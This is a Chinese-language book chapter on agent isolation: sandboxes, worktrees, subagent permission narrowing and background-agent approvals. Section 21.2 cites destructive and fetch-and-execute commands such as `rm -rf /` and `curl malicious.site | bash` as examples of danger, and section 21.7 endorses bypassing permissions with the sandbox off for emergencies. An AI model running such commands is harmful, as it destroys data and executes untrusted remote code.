# 第21章 隔离与防护

> "权限系统批准了操作，但万一出了 bug 怎么办？""Shell 命令能不能限制在特定目录？""子代理的权限会不会超过父会话？"

第20章讲的是**授权（Authorization）**——系统怎么决定你能做什么。但授权和隔离是两条**独立的轴线**：
- 一个操作可以被权限系统**批准**，但仍被**沙箱限制**
- 一个操作可以被权限系统**拒绝**，永远不到达沙箱检查

本章讲**隔离（Isolation）**——即使权限系统批准了操作，物理边界在哪里？Shell 沙箱、Agent 沙箱环境、worktree 分支隔离，以及子代理权限收缩，共同构成了"授权之外"的第二道防线。

---

## 21.1 分层安全架构：Defense in Depth

### 问题：授权批准了，沙箱拒绝了——这不是矛盾吗？

**背景**：用户可能困惑：如果权限系统已经批准了一个操作，为什么沙箱还会拒绝它？反之，如果沙箱能阻止操作，为什么还需要权限系统？

**为什么是问题**：如果把授权和隔离当成"同一层"，会觉得系统冗余、行为矛盾。但它们是两条独立轴线，各自解决不同层面的问题。

**授权 vs 隔离：两条独立轴线**

| 轴线 | 解决的问题 | 机制 | 失效场景 |
|------|-----------|------|---------|
| **授权（Authorization）** | "这个操作是否被允许？" | 权限模式、deny rules、分类器 | 规则配错、分类器误判 |
| **隔离（Isolation）** | "即使允许，能造成多大损害？" | 沙箱、worktree、权限收缩 | 绕过沙箱、逃逸漏洞 |

**徐文浩的安全原则**：

安全专家徐文浩提出的"安全边界内最大自由"原则，正是 Defense in Depth（纵深防御）的中国式表达：

> "在确认安全的边界内，给 Agent 最大的自由度；在边界外，用多层防御确保即使一层失效，其他层仍能保护。"

**四层防御模型**：

```
第1层：权限系统（Authorization）
  └── 决定"能不能做"
  └── 失效：规则错误、用户误批准

第2层：应用层限制（Application Constraints）
  └── 工具级限制（如 Explore agent 的 write deny-list）
  └── 失效：逻辑漏洞、配置错误

第3层：沙箱隔离（Sandboxing）
  └── 物理边界限制（文件系统、网络、进程）
  └── 失效：沙箱逃逸、内核漏洞

第4层：审计与恢复（Audit & Recovery）
  └── 事后发现、回滚、追责
  └── 失效：日志缺失、备份损坏
```

**为什么四层都需要**：

- 只依赖权限系统 → 用户误点"批准"，危险操作直接执行
- 只依赖沙箱 → 沙箱逃逸后无任何阻挡
- 只依赖审计 → 损害已经发生，只是事后知道

**结论**：授权和隔离不是替代关系，是互补关系。授权决定"能不能"，隔离决定"即使能，也跑不出去"。

**怎么做**：
- 不要因为有沙箱就放宽权限规则 → 两层都要坚固
- 不要因为有权限系统就忽视沙箱配置 → 权限可能被绕过或误批准
- 关键操作（生产环境）→ 同时启用严格权限 + 严格沙箱

## 21.2 Shell 沙箱

### 问题：Claude 执行的 Bash 命令，能限制在特定目录吗？能禁止访问网络吗？

**背景**：Bash 命令是 Agent 工具中最危险的类别之一。`rm -rf /`、`curl malicious.site | bash`、`sudo rm -rf` 等命令一旦执行，可能造成不可逆损害。

**为什么是问题**：权限系统可以拒绝明显的危险命令，但：
- 用户可能误批准一个"看起来正常"的命令
- 命令的副作用可能超出预期（如 `npm install` 执行了 postinstall 脚本）
- 权限系统无法预判命令的运行时行为

**Dive into Claude Code: The Design Space of Today's and Future AI Agent Systems**（Section 5.4）的 Shell 沙箱设计：

**shouldUseSandbox() 检查逻辑**：

系统在决定是否启用 Shell 沙箱时，执行三级检查：

```python
def shouldUseSandbox():
    # 检查1：全局沙箱是否启用？
    if not sandbox.enabled:
        return False
    
    # 检查2：调用是否显式 opt out？
    if command.has_opt_out_flag():
        return False
    
    # 检查3：命令是否匹配排除模式？
    if command.matches_exclusion_pattern():
        return False
    
    return True
```

**沙箱的隔离维度**：

| 隔离维度 | 机制 | 保护对象 |
|---------|------|---------|
| **文件系统** | chroot / namespace | 限制命令只能访问特定目录 |
| **网络** | 网络命名空间 | 禁止/限制外部网络访问 |
| **进程** | PID namespace | 隔离进程树，防止信号干扰 |
| **资源** | cgroups | 限制 CPU/内存使用 |

**为什么独立于应用层权限模型**：

Shell 沙箱是**操作系统级**的隔离，权限系统是**应用层**的判断。两者独立运作：
- 权限系统说"允许执行 npm install"
- 沙箱说"npm install 只能在当前项目目录运行，不能访问 ~/.ssh"
- 两个决策互不影响，共同生效

**Bash 和 PowerShell 的保护**：

Claude Code 对两种 Shell 都提供沙箱保护：
- **Bash**（Linux/macOS）：通过 namespace + chroot 实现隔离
- **PowerShell**（Windows）：通过 Windows 沙箱 API + 路径限制实现隔离

**结论**：Shell 沙箱是"最后一道物理防线"。即使权限系统批准了命令，沙箱确保命令的副作用被限制在可控范围内。

**怎么做**：
- 启用 Shell 沙箱：`sandbox.enabled: true` 在 settings.json 中
- 配置排除模式：某些安全命令（如 `git status`）可以排除在沙箱外，减少开销
- 不要 opt out 沙箱 → 除非你有明确的理由，且了解风险
- 审查 `npm install` / `pip install` → 这些命令会执行第三方代码，即使在沙箱内也要谨慎

## 21.3 七类 Agent 沙箱环境

### 问题：除了 Shell 沙箱，还有哪些沙箱类型？各适合什么场景？

**背景**：不同 Agent 任务有不同的安全需求。探索陌生代码库需要与实现功能不同的隔离强度，浏览器自动化又需要另一种环境。

**为什么是问题**：如果所有任务都用同一套沙箱，要么过度限制（影响效率），要么保护不足（存在风险）。

**Agent Harness Engineering: A Survey**（Section 3）提供了七类 Agent 沙箱环境的完整分类：

| 沙箱类型 | 隔离机制 | 适用场景 | 典型工具 |
|---------|---------|---------|---------|
| **General-Purpose Managed Sandboxes** | 容器/VM 级隔离 | 通用任务、不可信代码执行 | Docker、VM |
| **Computer-Use Agent Infrastructure** | 桌面环境隔离 | GUI 自动化、截图操作 | 虚拟桌面、VNC |
| **Code-Specialized Sandboxes** | 文件系统 + 网络隔离 | 代码生成、编译运行 | Firejail、nsjail |
| **Framework-Integrated Runtimes** | 框架级沙箱 | 特定语言运行（Python/JS） | PyPy sandbox、VM2 |
| **Browser Evaluation Environments** | 浏览器隔离 | Web 测试、爬虫 | Puppeteer sandbox、Playwright |
| **OS-Level Permission Sandboxes** | 系统调用过滤 | 系统级操作限制 | seccomp-bpf、AppArmor |
| **Sandbox Abstraction Layers** | 统一抽象接口 | 跨平台沙箱管理 | Claude Code 内部抽象 |

**各类详解**：

**General-Purpose Managed Sandboxes**：最强的隔离级别。整个 Agent 在 Docker 容器或 VM 中运行，与宿主机完全隔离。适用于运行完全不可信的代码（如审查外部提交的 PR）。

**Computer-Use Agent Infrastructure**：为 GUI 自动化设计的沙箱。Agent 可以控制鼠标、键盘、截图，但操作被限制在虚拟桌面内，不会影响宿主机。

**Code-Specialized Sandboxes**：专门为代码执行优化的沙箱。限制文件系统访问（只能读写工作目录）、限制网络（只能访问特定域名）、限制系统调用。

**Framework-Integrated Runtimes**：与特定语言运行时紧密集成的沙箱。例如 JavaScript 代码在 VM2 中运行，Python 代码在受限解释器中运行。比容器更轻量，但隔离强度较低。

**Browser Evaluation Environments**：为浏览器自动化设计的沙箱。每个浏览器实例独立运行，Cookie、本地存储、权限相互隔离。

**OS-Level Permission Sandboxes**：通过操作系统机制（seccomp-bpf、AppArmor、SELinux）限制进程的系统调用。开销极低，但配置复杂。

**Sandbox Abstraction Layers**：Claude Code 内部的统一沙箱接口。上层代码不需要关心底层是 Docker、namespace 还是 seccomp，通过统一 API 调用沙箱功能。

**结论**：沙箱不是"一刀切"。不同场景选择不同隔离强度，在安全和性能之间找到平衡。

**怎么做**：
- 日常代码开发 → Code-Specialized Sandboxes（足够且轻量）
- 运行不可信的外部代码 → General-Purpose Managed Sandboxes（Docker/VM）
- 浏览器自动化 → Browser Evaluation Environments
- 系统级脚本 → OS-Level Permission Sandboxes

## 21.4 Worktree 分支隔离

### 问题：Worktree 隔离在第18章讲过了，为什么在安全章节再次出现？

**背景**：第18章从"并行机制"角度讲了 worktree——怎么创建、怎么清理、怎么命名。但在安全视角下，worktree 是一种**文件系统级隔离**机制。

**为什么是问题**：如果只把 worktree 当作"并行工具"，会忽略它的安全价值。worktree 不仅防止并行任务互相干扰，还防止子代理的错误影响主仓库。

**Worktree 作为安全机制的三重保护**：

| 保护层面 | 机制 | 安全价值 |
|---------|------|---------|
| **文件系统隔离** | 独立工作目录 | 子代理的修改不会立即污染主仓库 |
| **Git 分支隔离** | 独立分支 | 即使子代理提交了错误代码，也在独立分支上 |
| **自动清理** | 完成且无更改时删除 | 临时 worktree 不留下持久风险 |

**三种隔离模式的安全选择**：

第18章 18.3 讲了三种隔离模式，从安全角度重新理解：

| 隔离模式 | 安全强度 | 适用场景 | 风险 |
|---------|---------|---------|------|
| **in-process** | 无 | 只读查询 | 子代理可读写主仓库文件 |
| **worktree** | 文件系统级 | 写操作任务 | 子代理可访问同机器的其他资源 |
| **remote** | 进程级 | 不可信代码 | 需要额外基础设施 |

**为什么 worktree 不是完整沙箱**：

worktree 隔离了**文件系统视图**，但没有隔离：
- 网络访问（子代理仍能访问外部 API）
- 进程空间（子代理和主进程共享同一机器）
- 系统资源（CPU、内存、磁盘无限制）

这意味着 worktree 是"中等强度"的隔离——比 in-process 强，比 Docker 弱。

**结论**：worktree 是 Claude Code 默认隔离策略的"甜点"——足够强（防止文件系统污染），足够轻（毫秒启动、零额外依赖）。但需要更强隔离时，要升级到容器/VM。

**怎么做**：
- 子代理执行写操作 → 默认启用 worktree 隔离（自动）
- 处理不可信代码 → 显式启用 remote 隔离（如果可用）或外部 Docker
- 不要仅依赖 worktree 隔离来处理敏感数据 → 结合权限系统的 deny rules

## 21.5 子代理权限收缩

### 问题：子代理的权限能超过父会话吗？我怎么确保子代理不会越权？

**背景**：第17章 17.7 和第19章 19.6 都提到了子代理的权限覆盖逻辑。但从安全角度，还有一个关键问题：子代理的权限**上限**在哪里？如果父会话有 `bypassPermissions`，子代理是否也自动获得？

**为什么是问题**：如果子代理能继承父会话的所有权限，甚至超过父会话，那么派生子代理就变成了"权限放大器"——一个 restricted 模式的子代理可能通过派生更多子代理来绕过限制。

**Dive into Claude Code: The Design Space of Today's and Future AI Agent Systems**（Section 8.2）的**权限收缩原则**：

**核心规则：子代理的权限不可超过父级**

```
父会话权限
  └── SDK-level: --allowedTools Read,Grep,Glob,Bash
  └── Session-level: permissionMode = default

子代理权限
  └── SDK-level: 继承（不可覆盖）→ Read,Grep,Glob,Bash
  └── Session-level: 可覆盖，但只能收缩 → permissionMode = restricted, allowedTools = [Read, Grep]

子代理的子代理权限
  └── SDK-level: 继承（不可覆盖）→ Read,Grep,Glob,Bash
  └── Session-level: 可覆盖，但只能进一步收缩 → allowedTools = [Read]
```

**两阶段模型的安全含义**：

| 阶段 | 可变性 | 安全约束 |
|------|--------|---------|
| **SDK-level** | 不可变 | 子代理继承，不可覆盖 |
| **Session-level** | 可变，但只能收缩 | 子代理可限制自己，不能放大 |

**为什么 SDK-level 不可覆盖**：

SDK-level 权限通常由启动参数或托管策略设置（如 `--allowedTools Read,Grep`）。如果子代理能覆盖这些设置，托管策略就形同虚设——用户可以通过派生子代理来绕过组织的安全策略。

**特权模式的保护**：

某些权限模式（`bypassPermissions`、`acceptEdits`、`auto`）具有特权属性：
- 父会话处于 `bypassPermissions` 模式时，子代理**不自动继承**
- 子代理默认回到 `restricted` 或 `default`
- 子代理要获得特权模式，需要**显式授权**

**结论**：子代理权限遵循"只能收缩、不能放大"原则。这是防止"权限逃逸"的核心机制——无论派生多少层子代理，权限只会越来越小，不会越来越大。

**怎么做**：
- 审查子代理的 AGENT.md → 确认 `allowed_tools` 是父级权限的子集
- 不要给子代理 `bypassPermissions` → 除非你有明确理由
- 定期审计子代理树 → 确保深层子代理的权限没有意外放大

## 21.6 后台代理权限沙箱

### 问题：后台运行的子代理，它的权限提示怎么处理？我在睡觉时它会不会乱来？

**背景**：第17章 17.2 讲了后台运行（`claude --bg`），第17章 17.7 讲了权限覆盖逻辑。但两者结合时产生了一个新问题：当子代理在后台运行且需要权限审批时，用户可能不在线。

**为什么是问题**：如果后台代理的权限请求都静默拒绝，很多正常任务会失败；如果都自动允许，又可能在无人监督时执行危险操作。

**后台代理的权限处理机制**：

| 场景 | 处理方式 | 安全含义 |
|------|---------|---------|
| **用户在线，子代理在前台** | Bubble 到主会话，用户即时审批 | 正常流程 |
| **用户在线，子代理在后台** | Bubble 到主会话，用户统一审批 | 用户可以看到但可能延迟响应 |
| **用户离线，子代理在后台** | 依赖分类器和 hooks | 无人工监督，全靠自动判断 |

**awaitAutomatedChecksBeforeDialog**：

这是一个关键配置。当启用时，系统在弹出权限对话框之前，会先等待：
1. Auto-Mode 分类器完成判断
2. PreToolUse hooks 完成检查

如果分类器或 hook 能自动解决（allow 或 deny），就不弹出对话框。只有当自动判断无法解决时，才请求人工审批。

**后台代理的安全建议**：

| 建议 | 原因 |
|------|------|
| 后台代理使用 `restricted` 权限模式 | 限制工具集，减少需要审批的场景 |
| 后台代理配置明确的 `allowed_tools` | 白名单机制，避免意外操作 |
| 避免后台代理使用 `Bash` | Bash 是最难自动判断安全的工具类别 |
| 定期检查后台代理日志 | 发现未预期的行为 |

**结论**：后台代理的权限处理是"自动判断为主、人工审批为辅"。分类器和 hooks 承担主要判断责任，人工审批作为兜底。

**怎么做**：
- 启动后台任务前 → 确认其权限配置是否合理
- 长期运行的后台任务 → 使用 `restricted` + 明确的 `allowed_tools`
- 定期检查 `claude agents` → 查看是否有异常的后台任务
- 敏感操作（生产环境修改）→ 不要在后台运行，保持前台监督

## 21.7 隔离级别选择指南

### 问题：这么多隔离机制，我怎么选？日常开发用哪个？高风险场景用哪个？

**背景**：Claude Code 提供了多种隔离机制（worktree、Shell 沙箱、Docker、权限收缩），用户需要一个清晰的决策框架。

**为什么是问题**：如果没有选择指南，用户要么"一刀切"（全部用最严格的，效率极低），要么"随机选"（凭感觉，安全风险）。

**决策矩阵**：

| 场景 | 隔离级别 | 权限模式 | 沙箱 | 原因 |
|------|---------|---------|------|------|
| **日常开发** | worktree | default | 启用 | 平衡安全和效率 |
| **探索陌生代码库** | worktree | restricted | 启用 | 只读 Explore，限制写操作 |
| **标准化流水线** | worktree | auto | 启用 | 重复任务，分类器可靠 |
| **高风险实验** | worktree + Shell 沙箱 | plan | 严格 | 每个操作都确认 |
| **完全不可信代码** | Docker/VM | restricted | 容器级 | 最强隔离 |
| **生产环境修改** | worktree | plan | 启用 | 人工审批每一小步 |
| **紧急恢复** | in-process | bypassPermissions | 禁用 | 争分夺秒，事后审计 |

**选择原则**：

1. **默认原则**：从"足够安全"开始，根据信任度逐步放宽
2. **最小隔离原则**：用能满足安全需求的**最轻量**隔离，而非最强隔离
3. **分层叠加原则**：多种隔离机制叠加使用，而非互相替代

**日常开发推荐配置**：

```json
{
  "permissionMode": "default",
  "sandbox": {
    "enabled": true,
    "shell": true
  },
  "subagentDefaults": {
    "isolation": "worktree",
    "permissionMode": "restricted"
  }
}
```

**结论**：隔离级别不是"越强越好"，是"越合适越好"。理解每种机制的能力和局限，根据场景选择组合。

**怎么做**：
- 新项目/陌生环境 → 从 plan + worktree + 沙箱 开始
- 建立信任后 → 逐步切换到 default / auto
- 不可信代码 → 升级到 Docker 沙箱
- 定期审查配置 → 确保隔离级别与当前风险匹配

## 21.8 安全层共享故障风险

### 问题：纵深防御听起来完美，但实际有没有漏洞？

**背景**：第20章 20.7 提到了安全层的共享故障风险——当负载过高时，系统回退到单一通用审批。本章从隔离角度补充另一个关键风险：隔离层之间的共享故障源。

**为什么是问题**：如果所有隔离层依赖同一个基础设施（如文件系统、网络栈、用户身份），这个基础设施的故障会导致所有层同时失效。

**共享故障源示例**：

| 共享资源 | 影响层 | 故障场景 |
|---------|--------|---------|
| **文件系统** | worktree、Shell 沙箱 | 磁盘损坏，所有隔离失效 |
| **网络栈** | 网络沙箱、Docker | 网络配置错误，所有网络隔离失效 |
| **用户身份** | 权限系统、沙箱 | 用户提权，所有身份检查失效 |
| **内核** | namespace、seccomp | 内核漏洞，所有 OS 级隔离失效 |

**>50 subcommands 案例的隔离含义**：

第20章提到的 >50 subcommands 回退案例，不仅是权限系统的问题，也影响隔离：

- 当系统处于"通用审批"模式时，用户只能"全部批准"或"全部拒绝"
- 用户可能为了推进任务选择"全部批准"
- 这意味着**权限层暂时失效**
- 此时隔离层（沙箱、worktree）成为唯一防线

**结论**：纵深防御的"深度"不是无限的。共享故障源和极端负载是两大威胁。理解这些限制，才能在高风险场景下做出正确决策。

**怎么做**：
- 不要同时依赖所有层 → 每层都假设其他层可能失效
- 关键操作分散执行 → 避免触发 >50 subcommands 的回退
- 定期测试隔离有效性 → 确认沙箱、worktree 仍然正常工作
- 保留审计日志 → 事后分析哪些层失效、为什么失效
